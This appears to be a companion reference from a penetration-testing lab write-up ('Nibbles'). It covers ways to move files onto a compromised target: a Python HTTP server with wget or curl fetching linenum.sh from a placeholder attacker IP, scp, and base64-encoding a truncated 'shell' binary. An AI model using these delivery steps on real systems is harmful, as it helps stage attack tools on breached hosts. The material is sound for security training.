# File Transfer Techniques — Reference

> A companion reference for the *Nibbles* engagement. Covers techniques for transferring files
> between an attack host and a compromised target. These methods apply broadly across penetration
> testing engagements; they are documented here because the Python HTTP server + wget method was
> used during this assessment to deliver LinEnum.

> ℹ️ **Defanging note.** All IPs are defanged for filter compatibility. `md5sum` values shown are
> file-integrity checksums, not credentials — they are left intact because verifying them is the
> point of that section. See [`SANITIZATION.md`](../../../SANITIZATION.md).

---

## Method 1 — Python HTTP Server + wget / curl

The most common ad-hoc transfer method for lab environments. The attack host serves a file over
HTTP; the target pulls it down.

**Attack host — serve from a specific directory:**

```bash
cd /tmp
sudo python3 -m http.server 8080 --directory /tmp
```

> **Important:** always specify `--directory` explicitly. Python's HTTP server publishes the
> current working directory by default. Omitting this flag caused an `HTTP 404` during this
> engagement — the server was reachable but serving the wrong directory. The 404 response confirmed
> network connectivity was intact; the fault was a document-root mismatch, not a firewall or
> routing issue. Specifying `--directory` eliminates this ambiguity and makes the transfer
> reproducible regardless of launch location.

**Target — with `wget`:**

```bash
wget hxxp://<ATTACKER_IP>:8080/linenum.sh
```
```
Saving to: 'linenum.sh'
linenum.sh  100%[===============================>]  45.54K  163KB/s  in 0.3s
'linenum.sh' saved [46631/46631]
```

**Target — with `curl`** (if `wget` is unavailable):

```bash
curl hxxp://<ATTACKER_IP>:8080/linenum.sh -o linenum.sh
```

The `-o` flag sets the output filename. `curl` produces no progress output with `-s`; omit `-s`
or use `-v` to confirm the transfer.

---

## Method 2 — SCP (with SSH credentials)

When valid SSH credentials for the target have been obtained, `scp` provides an authenticated,
encrypted transfer.

```bash
scp linenum.sh user@remotehost:/tmp/linenum.sh
```
```
user@remotehost's password: *********
linenum.sh
```

The local filename comes immediately after `scp`; the destination path follows the `:`.

---

## Method 3 — Base64 (when direct transfer is blocked)

When the target cannot reach the attack host over HTTP (egress firewall, no outbound routing),
a file can be encoded as base64, pasted as a string on the target, and decoded back to binary.
No additional network connection is required beyond the existing shell.

**Encode on the attack host:**

```bash
base64 shell -w 0
```
```
f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
```

The `-w 0` flag disables line wrapping so the output is a single string.

**Decode on the target:**

```bash
echo 'f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU' | base64 -d > shell
```

> The base64 blob above is illustrative and truncated (`<SNIP>`).

---

## Validating Transfers

Always validate a transferred file before executing it.

**Check file type:**

```bash
file shell
```
```
shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
```

An `ELF` result confirms the binary arrived intact and was not corrupted or partially transferred.

**Verify integrity with md5sum** — compare on both ends:

Attack host:
```bash
md5sum shell
```
```
321de1d7e7c3735838890a72c9ae7d1d  shell
```

Target:
```bash
md5sum shell
```
```
321de1d7e7c3735838890a72c9ae7d1d  shell
```

Matching hashes confirm byte-identical transfer. This is especially important for base64
transfers where encoding/decoding errors can silently corrupt a binary.

---

## Summary

| Method | When to use | Tools |
|---|---|---|
| Python HTTP server | Target can reach attack host over HTTP | `python3 -m http.server`, `wget`, `curl` |
| SCP | SSH credentials available for the target | `scp` |
| Base64 | Direct file transfer is blocked by egress filtering | `base64`, `base64 -d` |
| Validation | Always, after every transfer | `file`, `md5sum` |

**Takeaway:** match the transfer method to the target's network constraints. Always validate with
`file` and `md5sum` before executing a transferred binary. When using the Python HTTP server,
specify `--directory` explicitly to avoid document-root mismatches that produce misleading `404`
responses.
